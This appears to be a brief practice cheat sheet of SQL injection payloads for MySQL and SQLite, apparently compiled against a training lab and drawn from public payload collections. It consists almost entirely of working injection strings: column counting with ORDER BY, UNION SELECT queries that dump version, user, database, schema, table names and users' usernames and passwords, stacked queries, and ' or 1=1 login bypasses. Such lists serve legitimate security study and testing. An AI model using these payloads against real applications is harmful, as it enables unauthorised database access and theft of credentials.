tests site from: https://cylab.be/resources/cylab-play

to know columns count:

```
 ' order by 1 #
 ' order by 2 #
 ' order by 3 #
 ' order by 4 # // this one error out, so there is 3 columns
```

mysql injection:
https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

```
 ' union select null,null,version() #
 ' union select null,null,user() #
 ' union select null,null,database() #
 ' union select null,username,password from users #
 ' union select null,table_schema,table_name FROM information_schema.tables #
 ' union select null,table_name,column_name FROM information_schema.columns #

' or 1=1
```

sqlite injection:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

```
 ' union select null,null,sqlite_version() --
 ' union select null,username,password from users --
 ' union select name from sqlite_schema --

'; SELECT sql FROM sqlite_schema --
' or 1=1
```
